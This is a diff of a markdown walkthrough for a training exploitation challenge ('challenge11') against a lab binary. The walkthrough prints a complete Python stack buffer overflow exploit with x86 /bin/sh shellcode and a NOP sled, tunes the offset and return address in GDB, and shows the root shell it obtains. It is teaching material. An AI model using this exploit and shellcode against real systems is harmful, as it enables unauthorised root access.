@@ -67,15 +67,38 @@ Not admin.
 
 ## The exploit
 
-Read the prepared exploit `challenge11-exploit.py`. Change the following two values:
+Read the prepared exploit `challenge11-exploit.py`. 
+```python
+#!/usr/bin/python3
+# Skeleton exploit for challenge11
 
+import sys
+
+shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
+offset = 0
+ret_addr = b"\x41\x41\x41\x41"
+
+def make(offset, ret_addr, buf_size=128):
+    exploit = b"\x90" * (buf_size - len(shellcode))
+    exploit += shellcode
+
+    exploit += b"A" * (offset - len(exploit))
+    exploit += ret_addr
+
+    return exploit
+
+exploit = make(offset, ret_addr)
+sys.stdout.buffer.write(exploit)
+```
+
+Change the following two values:
 ```
 offset = 132
 ret_addr = b"\x42\x42\x42\x42"
 ```
 
 And observe its output:
-```
+```sh
 ~/challenges/challenge11$ ./challenge11-exploit.py | hexdump -Cv
 00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
 00000010  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
@@ -171,14 +194,14 @@ End of assembler dump.
 
 Set Breakpoint in GDB. We can break anywhere in the function, lets say at the `ret` instruction
 at `0x08049284` or `handleData+115`:
-```
+```sh
 (gdb) b *handleData+115
 Breakpoint 1 at 0x8049284: file challenge11.c, line 33.
 ```
 
-Run it with the parameter "AAAAAAAA test":
+Run it as before:
 
-```
+```sh
 (gdb) r `perl -e 'print "A" x 144 . "BBBB"'` password
 Starting program: /root/challenges/challenge11/challenge11 `perl -e 'print "A" x 144 . "BBBB"'` password
 isAdmin: 0x41414141
@@ -190,8 +213,8 @@ Breakpoint 1, 0x08049284 in handleData (username=0xffffde00 "LC\253,h1T\345\356.
 $1 = (char (*)[128]) 0xffffdb9c
 ```
 
-So the address of the `char name[128]` local variable in the function `handleData()` is
-`0xffffdb9c` in memory / RAM. 
+So `print &name` shows us the address of the `char name[128]` local variable in the function `handleData()`,
+which is `0xffffdb9c` in memory / RAM. 
 
 Lets verify this by printing a string at that location:
 ```
@@ -202,44 +225,15 @@ Lets verify this by printing a string at that location:
 Note that there is a high probability that you get a slightly different address (unlike the offset, which is pretty stable). 
 
 
-## Create an exploit
+## Exploit writing
 
-The prepared exploit skeleton is available at the file `challenge11-exploit.py`:
-
-```
-#!/usr/bin/python3
-# Skeleton exploit for challenge11
-
-import sys
-
-shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
-offset = 0
-ret_addr = b"\x41\x41\x41\x41"
-
-def make(offset, ret_addr, buf_size=128):
-    exploit = b"\x90" * (buf_size - len(shellcode))
-    exploit += shellcode
-
-    exploit += b"A" * (offset - len(exploit))
-    exploit += ret_addr
-
-    return exploit
-
-exploit = make(offset, ret_addr)
-sys.stdout.buffer.write(exploit)
-```
-
-We can insert our values:
+We can insert our values into our prepared exploit `challenge11-exploit.py`:
 ```
 offset = 144
 ret_addr = "\x9c\xdb\xff\xff"
 ```
 
 Remember to convert the `ret_value` number `0xffffdb9c` into little endian first. 
-
-
-## Test exploit
-
 
 Lets try our new exploit:
 ```
@@ -257,7 +251,7 @@ Lets try our new exploit:
 00000094
 ```
 
-Execute it in GDB:
+Looking good. Execute it in GDB:
 ```
 (gdb) r `python3 ./challenge11-exploit.py` password
 Starting program: /root/challenges/challenge11/challenge11 `python3 ./challenge11-exploit.py` password
@@ -271,13 +265,15 @@ uid=0(root) gid=0(root) groups=0(root)
 #
 ```
 
-The program spawned a usable shell!
+It worked! The program spawned a usable shell!
 
 
-## Verify
+## Verify in GDB
 
-Again above, but checking if everything works:
+Lets check how the exploit looks like in GDB.
 
+Set a breakpoint at `handleData+115`, which is again exactly before the `ret` (= `pop eip`)
+instruction gets executed. 
 ```
 (gdb) b *handleData+115
 Breakpoint 1 at 0x8049284: file challenge11.c, line 33.
@@ -288,13 +284,15 @@ You are admin!
 
 Breakpoint 1, 0x08049284 in handleData (username=0xffffde00 "\a\240<\026#\230\223\274\n\a\257i686", password=0xffffded7 "password") at challenge11.c:33
 33      }
+```
 
+Whats the value on the stack which will be put into EIP?
+```
 (gdb) x/1x $esp
 0xffffdc2c:     0xffffdb9c
 ```
 
 The value at ESP is `0xffffdb9c`. This gets loaded into EIP. It should point to our shellcode:
-
 ```
 (gdb) x/32i 0xffffdb9c
    0xffffdb9c:  nop
@@ -322,6 +320,8 @@ The value at ESP is `0xffffdb9c`. This gets loaded into EIP. It should point to 
    0xffffdc1f:  inc    ecx
    0xffffdc20:  inc    ecx
 ```
+
+As expected: We see the NOP sled, and the shellcode after starting at address `0xffffdc05`.
 
 
 ## Test exploit without gdb
@@ -358,8 +358,8 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 0xffffdc1d:     0x90909090      0x90909090      0x90909090      0x90909090
 ```
 
-We can simple look where EIP is pointing, and realize that the actual shellcode
-seems to be several bytes behind the current EIP. The `0x90` actually start at
+We can simply look where EIP is pointing, and realize that the actual shellcode
+seems to be several dozen bytes behind the current EIP. The `0x90` actually start at
 around `0xffffdbed`. Lets jump a bit more in the middle of the shellcode,
 lets say at address `0xffffdc0d`:
 
@@ -380,6 +380,7 @@ Therefore, lets adjust the exploit once again:
 ret_addr = "\x0d\xdc\xff\xff"
 ```
 
+And try it again, outside GDB:
 ```
 ~/challenges/challenge11$ ./challenge11 `python3 ./challenge11-exploit.py` password
 isAdmin: 0x41414141
@@ -389,9 +390,10 @@ uid=0(root) gid=0(root) groups=0(root)
 #
 ```
 
-It works!
+It works! The bash has been executed.
+
 
 ## Things to think about
 
-* Can you create an exploit which works with, and without GDB?
+* Can you create an exploit which works with both, and without GDB?
 * Can you create an exploit where the shellcode is stored in the variable password (argv[2])?
